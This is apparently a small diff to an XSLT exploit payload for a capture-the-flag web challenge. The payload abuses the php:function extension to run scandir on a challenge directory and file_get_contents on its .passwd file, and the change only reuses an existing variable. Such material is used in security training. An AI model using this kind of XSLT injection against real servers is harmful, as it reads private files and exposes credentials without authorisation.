@@ -3,7 +3,7 @@ xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:php="http://php.net/xsl">	
 <xsl:template match="/">	
 <xsl:variable  name="scand"    select="php:function('scandir','/challenge/web-serveur/ch50')" />
-<xsl:variable  name="strscand" select="php:function('implode',php:function('scandir','/challenge/web-serveur/ch50'),'')" /> 
+<xsl:variable  name="strscand" select="php:function('implode',$scand,'')" /> 
 <xsl:variable  name="header"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/.passwd')"/>
 <div style="background-color:teal;color:white;padding:4px">
 <span style="font-weight:bold">
